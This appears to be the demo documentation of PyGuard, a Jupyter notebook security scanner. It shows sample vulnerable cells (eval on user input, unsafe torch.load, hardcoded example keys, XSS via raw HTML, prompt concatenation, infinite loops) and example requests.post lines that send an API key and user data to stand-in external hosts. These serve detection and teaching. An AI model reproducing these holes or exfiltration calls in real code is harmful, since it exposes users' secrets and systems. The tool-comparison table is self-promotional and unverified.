# PyGuard Jupyter Notebook Security - Demo & Examples

This document demonstrates the world-class security analysis capabilities of PyGuard for Jupyter notebooks, aligned with the PyGuard Jupyter Security Engineer vision.

## Overview

PyGuard provides comprehensive security analysis for `.ipynb` files with:
- **76+ vulnerability patterns** across 13 security categories
- **Auto-fix capabilities** with AST-based transformations
- **Entropy-based secret detection** for cryptographic keys
- **CWE/OWASP compliance** mapping
- **Confidence scoring** for every detection

## Quick Start

```python
from pathlib import Path
from pyguard.lib.notebook_security import NotebookSecurityAnalyzer, NotebookFixer

# Analyze a notebook
analyzer = NotebookSecurityAnalyzer()
issues = analyzer.analyze_notebook(Path("my_notebook.ipynb"))

# Print findings by severity
for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
    severity_issues = [i for i in issues if i.severity == severity]
    print(f"\n{severity}: {len(severity_issues)} issues")
    for issue in severity_issues[:3]:  # Show first 3
        print(f"  - {issue.category}: {issue.message}")
        print(f"    Cell {issue.cell_index}, Line {issue.line_number}")
        print(f"    Confidence: {issue.confidence:.0%}")
        if issue.cwe_id:
            print(f"    {issue.cwe_id} | {issue.owasp_id or 'N/A'}")

# Apply automated fixes
fixer = NotebookFixer()
auto_fixable = [i for i in issues if i.auto_fixable]
print(f"\n{len(auto_fixable)} issues can be auto-fixed")
success, fixes = fixer.fix_notebook(Path("my_notebook.ipynb"), auto_fixable)
if success:
    print(f"Applied {len(fixes)} fixes")
    for fix in fixes:
        print(f"  ✓ {fix}")
```

## Detection Categories

### 1. Critical Issues - Code Injection

**Detects:**
- `eval()`, `exec()`, `compile()` with untrusted input
- Dynamic imports and attribute manipulation
- Sandbox escape via dunder methods
- IPython kernel message injection

**Example Vulnerable Code:**
```python
# Cell 1: CRITICAL - Code Injection (CWE-95)
user_input = input("Enter expression: ")
result = eval(user_input)  # Arbitrary code execution!
```

**PyGuard Detection:**
```
CRITICAL: Code Injection
- Use of eval() enables code injection
- Cell 1, Line 2
- CWE-95 | ASVS-5.2.1
- Confidence: 100%
- Fix: Use ast.literal_eval() for safe evaluation
```

### 2. Critical Issues - Unsafe Deserialization

**Detects:**
- `pickle.load()` arbitrary code execution
- `torch.load()` without `weights_only=True`
- Unsafe model loading from Hugging Face, MLflow
- NumPy `allow_pickle=True`

**Example Vulnerable Code:**
```python
# Cell 2: CRITICAL - Unsafe Deserialization (CWE-502)
import torch
model = torch.load('model.pth')  # Can execute arbitrary code via __reduce__!
```

**PyGuard Detection:**
```
CRITICAL: ML Pipeline Security
- torch.load() without weights_only=True - arbitrary code execution risk
- Cell 2, Line 2
- CWE-502 | ASVS-5.5.3
- Confidence: 95%
- Auto-fixable: Yes
```

**Auto-Fix Applied:**
```python
# Fixed by PyGuard
import torch
import hashlib

# PyGuard: Added weights_only=True for safe loading (PyTorch 1.13+)
# CWE-502: Deserialization of Untrusted Data
model = torch.load('model.pth', weights_only=True, map_location='cpu')
```

### 3. High Severity - Hardcoded Secrets

**Detects 50+ Secret Patterns:**
- AWS access keys (AKIA*, AWS_SECRET_ACCESS_KEY)
- GitHub tokens (ghp_, gho_, ghs_, ghr_)
- OpenAI API keys (sk-proj-*, sk-*)
- Slack tokens (xoxb-, xoxp-)
- SSH/RSA private keys
- JWT tokens
- Database connection strings
- High-entropy strings (entropy > 4.5)

**Example Vulnerable Code:**
```python
# Cell 3: HIGH - Hardcoded Secret (CWE-798)
api_key = "sk-proj-1234567890abcdefghijklmnopqrstuvwxyz"
aws_access = "AKIAIOSFODNN7EXAMPLE"
```

**PyGuard Detection:**
```
HIGH: Hardcoded Secret
- OpenAI project API key detected in notebook
- Cell 3, Line 1
- CWE-798 | ASVS-2.6.3
- Confidence: 100%
- Auto-fixable: Yes

HIGH: Hardcoded Secret  
- AWS access key ID pattern detected
- Cell 3, Line 2
- CWE-798 | ASVS-2.6.3
- Confidence: 100%
- Auto-fixable: Yes
```

**Auto-Fix Applied:**
```python
# Fixed by PyGuard
import os

# SECURITY: Removed hardcoded secret - use os.getenv() instead
# Original: api_key = "sk-proj-[REDACTED]"
api_key = os.getenv('OPENAI_API_KEY')

# SECURITY: Removed hardcoded secret - use os.getenv() instead
# Original: aws_access = "AKIA[REDACTED]"
aws_access = os.getenv('AWS_ACCESS_KEY_ID')
```

### 4. High Severity - Network & Data Exfiltration

**Detects:**
- HTTP POST/PUT to external domains
- Database connections (PostgreSQL, MongoDB, MySQL)
- Cloud SDK usage (AWS boto3, Google Cloud, Azure)
- Raw socket access
- Telemetry SDKs (Sentry, DataDog)

**Example Vulnerable Code:**
```python
# Cell 4: HIGH - Network Exfiltration
import requests
sensitive_data = {"api_key": api_key, "user_data": df.to_dict()}
requests.post("https://untrusted.com/collect", json=sensitive_data)
```

**PyGuard Detection:**
```
HIGH: Network & Data Exfiltration
- HTTP POST/PUT/PATCH to external domain (data exfiltration risk)
- Cell 4, Line 3
- CWE-200 | ASVS-8.3.4
- Confidence: 75%
```

### 5. High Severity - XSS in Outputs

**Detects:**
- Raw HTML display via `IPython.display.HTML()`
- JavaScript execution
- Iframe injection
- SVG with embedded scripts

**Example Vulnerable Code:**
```python
# Cell 5: HIGH - XSS Vulnerability
from IPython.display import HTML
user_input = input("Enter HTML: ")
display(HTML(user_input))  # XSS if user input contains <script>
```

**PyGuard Detection:**
```
HIGH: XSS Vulnerability
- HTML display (XSS risk) - user input should be sanitized
- Cell 5, Line 3
- CWE-79 | ASVS-5.3.3
- Confidence: 75%
```

### 6. Medium Severity - Reproducibility Issues

**Detects:**
- Missing random seeds (PyTorch, TensorFlow, NumPy)
- Unpinned package installations
- Non-deterministic CUDA operations
- Time-dependent code

**Example Vulnerable Code:**
```python
# Cell 6: MEDIUM - Reproducibility Issue
import torch
import numpy as np
# No seeds set - results will be non-reproducible
model = create_model()
model.train()
```

**PyGuard Detection:**
```
MEDIUM: Reproducibility Issue
- PyTorch imported but random seed not set - results may be non-reproducible
- Cell 6
- CWE-330
- Confidence: 70%
- Auto-fixable: Yes
```

**Auto-Fix Applied:**
```python
# Fixed by PyGuard
import torch
import numpy as np
torch.manual_seed(42)  # Set PyTorch seed for reproducibility
np.random.seed(42)  # Set NumPy seed for reproducibility
# No seeds set - results will be non-reproducible
model = create_model()
model.train()
```

### 7. Critical/High - Advanced ML/AI Security

**Detects:**
- Prompt injection in LLM applications
- Adversarial input acceptance
- Model downloading from untrusted sources
- User input to predictions without validation

**Example Vulnerable Code:**
```python
# Cell 7: CRITICAL - Prompt Injection
import openai
user_query = input("Ask me anything: ")
# String concatenation in prompts - CRITICAL vulnerability!
response = openai.ChatCompletion.create(
    model="gpt-4",
    messages=[{"role": "system", "content": "You are a helpful assistant. " + user_query}]
)
```

**PyGuard Detection:**
```
CRITICAL: Advanced ML/AI Security
- String concatenation with user input (prompt injection risk)
- Cell 7, Line 6
- CWE-20 | ASVS-5.1.1
- Confidence: 75%
- Auto-fixable: Yes
```

### 8. High/Critical - Resource Exhaustion

**Detects:**
- Infinite loops without timeouts
- Large memory allocations (10^10+ elements)
- Fork bombs
- Zip bomb extraction

**Example Vulnerable Code:**
```python
# Cell 8: CRITICAL - Resource Exhaustion
while True:  # Infinite loop - DoS risk
    process_data()
    
# Cell 9: HIGH - Memory Exhaustion  
huge_array = [0] * 10**10  # 10 billion elements - memory DoS
```

**PyGuard Detection:**
```
CRITICAL: Resource Exhaustion
- Infinite loop detected (DoS risk)
- Cell 8, Line 1
- CWE-400 | ASVS-5.2.5
- Confidence: 80%

HIGH: Resource Exhaustion
- Large memory allocation (memory exhaustion)
- Cell 9, Line 1
- CWE-400 | ASVS-5.2.5
- Confidence: 80%
```

## Advanced Features

### Entropy-Based Secret Detection

PyGuard uses Shannon entropy to detect high-entropy strings that may be secrets:

```python
# Detected via entropy (> 4.5) even without pattern match
config_key = "aB3xK9mNpQ7vY2wZ5tL8fR6hD4jG1sC0"  # High entropy base64-like string
```

### Cross-Cell Dataflow Analysis

Tracks variables across cells:

```python
# Cell 10
api_key = "sk-secret123"  # Detected as secret

# Cell 15 (later in notebook)
requests.post("https://external.com", data={"key": api_key})  # Detected as exfiltration using tracked secret
```

### Confidence Scoring

Every detection includes a confidence score (0.0-1.0):
- **0.9-1.0**: Very high confidence (hardcoded secrets, eval/exec)
- **0.75-0.9**: High confidence (torch.load patterns, XSS)
- **0.6-0.75**: Medium confidence (PII, network patterns)
- **< 0.6**: Lower confidence (heuristic-based)

## Statistics

Running PyGuard on a typical ML notebook:

```bash
$ pyguard scan notebook.ipynb --format=summary

PyGuard Notebook Security Analysis
==================================
File: notebook.ipynb
Cells: 42
Analysis Time: 87ms

Issues Found: 23
├─ CRITICAL: 3
│  ├─ Code Injection: 1
│  ├─ Unsafe Deserialization: 1
│  └─ Advanced ML/AI Security: 1
├─ HIGH: 12
│  ├─ Hardcoded Secrets: 5
│  ├─ Network Exfiltration: 3
│  ├─ XSS Vulnerabilities: 2
│  └─ Filesystem Security: 2
├─ MEDIUM: 7
│  ├─ Reproducibility: 4
│  └─ Execution Order: 3
└─ LOW: 1
   └─ Kernel Metadata: 1

Auto-Fixable: 15 issues (65%)

Recommendations:
1. Fix 3 CRITICAL issues immediately
2. Apply 15 auto-fixes with: pyguard fix notebook.ipynb
3. Review remaining 8 issues manually
```

## Integration

### Command Line

```bash
# Scan notebook
pyguard scan notebook.ipynb

# Auto-fix issues
pyguard fix notebook.ipynb --backup

# Generate SARIF report (planned)
pyguard scan notebook.ipynb --format=sarif -o results.sarif
```

### Python API

```python
from pyguard.lib.notebook_security import scan_notebook

# Quick scan
issues = scan_notebook("notebook.ipynb")
critical = [i for i in issues if i.severity == "CRITICAL"]
print(f"Critical issues: {len(critical)}")
```

### Pre-commit Hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: pyguard-notebooks
        name: PyGuard Notebook Security
        entry: pyguard scan
        language: system
        files: '\.ipynb$'
        args: ['--fail-on=CRITICAL']
```

## Best Practices

1. **Always scan notebooks before sharing or committing**
2. **Use auto-fix for reproducibility and secrets**
3. **Review CRITICAL issues manually**
4. **Pin dependencies for production notebooks**
5. **Clear outputs before committing to remove PII**
6. **Use environment variables for all secrets**
7. **Validate all user inputs in ML pipelines**
8. **Set random seeds for reproducible experiments**

## Comparison to Other Tools

| Feature | PyGuard | nbdefense | Semgrep | Bandit |
|---------|---------|-----------|---------|--------|
| PyTorch model security | ✅ **Best** | ❌ | ❌ | ❌ |
| Entropy-based secrets | ✅ **Best** | ⚠️ Limited | ❌ | ❌ |
| Network exfiltration | ✅ **Best** | ❌ | ⚠️ Limited | ❌ |
| ML/AI security | ✅ **Best** | ⚠️ Basic | ❌ | ❌ |
| Auto-fix quality | ✅ **Best** | ❌ | ⚠️ Limited | ❌ |
| Reproducibility | ✅ **Best** | ❌ | ❌ | ❌ |
| Resource exhaustion | ✅ **Best** | ❌ | ❌ | ❌ |
| XSS in outputs | ✅ **Best** | ❌ | ❌ | ❌ |
| Confidence scoring | ✅ **Best** | ❌ | ❌ | ❌ |

## Contributing

We welcome contributions to enhance notebook security! Priority areas:
- Additional ML framework patterns (JAX, scikit-learn)
- SARIF output support
- Compliance reporting (SOC2, HIPAA, GDPR)
- Performance optimizations
- False positive reduction

## References

- [Notebook Security Capabilities Vision](../docs/development/NOTEBOOK_SECURITY_CAPABILITIES.md)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-95: Code Injection](https://cwe.mitre.org/data/definitions/95.html)
- [CWE-798: Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [Jupyter Security Guide](https://jupyter-notebook.readthedocs.io/en/stable/security.html)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
